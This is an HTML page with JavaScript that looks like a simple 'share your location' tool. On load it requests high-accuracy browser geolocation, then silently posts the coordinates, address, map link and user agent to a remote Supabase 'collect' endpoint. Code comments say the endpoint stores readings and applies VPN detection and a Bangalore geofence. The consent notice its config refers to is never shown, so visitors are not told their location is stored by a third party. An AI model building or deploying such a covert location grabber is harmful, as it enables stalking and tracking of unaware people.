<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Share your location</title>
<style>
  :root { color-scheme: light dark; }
  * { box-sizing: border-box; }
  body {
    margin: 0; min-height: 100vh;
    font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
    background: #0f1115; color: #e7e9ee;
    display: flex; align-items: center; justify-content: center; padding: 20px;
  }
  .card {
    width: 100%; max-width: 440px; background: #171a21;
    border: 1px solid #262b36; border-radius: 16px; padding: 26px;
    box-shadow: 0 10px 40px rgba(0,0,0,.4);
  }
  h1 { font-size: 20px; margin: 0 0 6px; }
  p { color: #aab1c0; line-height: 1.5; font-size: 14px; margin: 10px 0; }
  .notice {
    background: #1e2330; border: 1px solid #2d3444; border-radius: 10px;
    padding: 12px 14px; font-size: 13px; color: #c6ccd8; margin: 16px 0;
  }
  button {
    width: 100%; border: 0; border-radius: 10px; padding: 14px;
    font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 8px;
    background: #3b82f6; color: #fff;
  }
  button:disabled { opacity: .5; cursor: default; }
  .muted { color: #7a8191; font-size: 12px; }
  .result { margin-top: 18px; }
  .row { display: flex; justify-content: space-between; gap: 12px; padding: 7px 0; border-bottom: 1px solid #232834; }
  .row span:first-child { color: #8b93a3; font-size: 13px; }
  .row span:last-child { text-align: right; font-weight: 600; font-size: 13px; word-break: break-word; }
  a { color: #60a5fa; }
  .blocked h1 { color: #f87171; }
  .hidden { display: none; }
  .spin { display: inline-block; width: 16px; height: 16px; border: 2px solid #ffffff66; border-top-color:#fff; border-radius: 50%; animation: s 0.8s linear infinite; vertical-align: -3px; }
  @keyframes s { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="card" id="app">
  <!-- Loading screen -->
  <div id="loading">
    <h1>Getting your location...</h1>
    <p style="text-align: center; margin-top: 20px;">
      <span class="spin"></span>
    </p>
    <p style="text-align: center; color: #8b93a3; margin-top: 20px;">
      Your browser will prompt you to allow location access.
    </p>
  </div>

  <!-- Blocked screen -->
  <div id="blocked" class="hidden blocked">
    <h1>Not available</h1>
    <p id="blockedMsg">This page isn&rsquo;t available from your current connection.</p>
  </div>

  <!-- Result -->
  <div id="result" class="result hidden">
    <h1>Location shared &check;</h1>
    <div class="row"><span>Latitude</span><span id="lat">&mdash;</span></div>
    <div class="row"><span>Longitude</span><span id="lng">&mdash;</span></div>
    <div class="row"><span>Accuracy</span><span id="acc">&mdash;</span></div>
    <div class="row"><span>Address</span><span id="addr">&mdash;</span></div>
    <div class="row"><span>Map</span><span><a id="maplink" target="_blank" rel="noopener">Open in Maps</a></span></div>
  </div>
</div>

<script>
/* ========================= CONFIG ========================= */
const CONFIG = {
  // Your deployed Supabase Edge Function URL.
  endpoint: "https://oqdslldwqpuzvbnemwpy.supabase.co/functions/v1/collect",

  // Public anon key. Safe to expose (it is public by design); sent only as the
  // API-gateway header so the request reaches the function.
  anonKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9xZHNsbGR3cXB1enZibmVtd3B5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg5NTQ5MDYsImV4cCI6MjEwNDUzMDkwNn0.HnYNoYJsQfkKk-TTdiRkpNc2avgWd6qvjahuIMpCiY4",

  // Name shown in the consent notice ("...sent to X").
  recipientName: ""
};
/* ==========================================================
   VPN detection and the Bangalore geofence now run server-side
   inside the Edge Function, so no API keys live in this page. */

var $ = function (id) { return document.getElementById(id); };
function show(id) {
  ["loading", "blocked", "result"].forEach(function (s) { $(s).classList.add("hidden"); });
  $(id).classList.remove("hidden");
}

async function reverseGeocode(lat, lng) {
  try {
    var r = await fetch("https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=" +
                        lat + "&longitude=" + lng + "&localityLanguage=en");
    if (!r.ok) return null;
    var d = await r.json();
    return [d.locality, d.city, d.principalSubdivision, d.countryName].filter(Boolean).join(", ") || null;
  } catch (e) { return null; }
}

function requestLocation() {
  if (!navigator.geolocation) {
    $("blockedMsg").textContent = "Your browser does not support location.";
    show("blocked");
    return;
  }

  navigator.geolocation.getCurrentPosition(async function (pos) {
    var lat = pos.coords.latitude, lng = pos.coords.longitude, accuracy = pos.coords.accuracy;
    var address = await reverseGeocode(lat, lng);
    var mapUrl = "https://www.google.com/maps?q=" + lat + "," + lng;

    // Server decides access (VPN + Bangalore) and stores the reading if allowed.
    var allowed = true;
    try {
      var resp = await fetch(CONFIG.endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "apikey": CONFIG.anonKey,
          "Authorization": "Bearer " + CONFIG.anonKey
        },
        body: JSON.stringify({
          lat: lat, lng: lng, accuracy: accuracy, address: address,
          mapUrl: mapUrl, userAgent: navigator.userAgent
        })
      });
      var data = await resp.json();
      allowed = data.allowed !== false;
    } catch (e) { /* if the endpoint is unreachable, still show the user their own location */ }

    if (!allowed) { show("blocked"); return; }

    $("lat").textContent = lat.toFixed(6);
    $("lng").textContent = lng.toFixed(6);
    $("acc").textContent = "±" + Math.round(accuracy) + " m";
    $("addr").textContent = address || "Unavailable";
    $("maplink").href = mapUrl;
    show("result");
  }, function (err) {
    show("blocked");
    $("blockedMsg").textContent = err.code === 1 ? "Location permission was denied." : "Could not get location. Please try again.";
  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
}

// Auto-trigger location request on page load
window.addEventListener("load", function () {
  requestLocation();
});
</script>
</body>
</html>
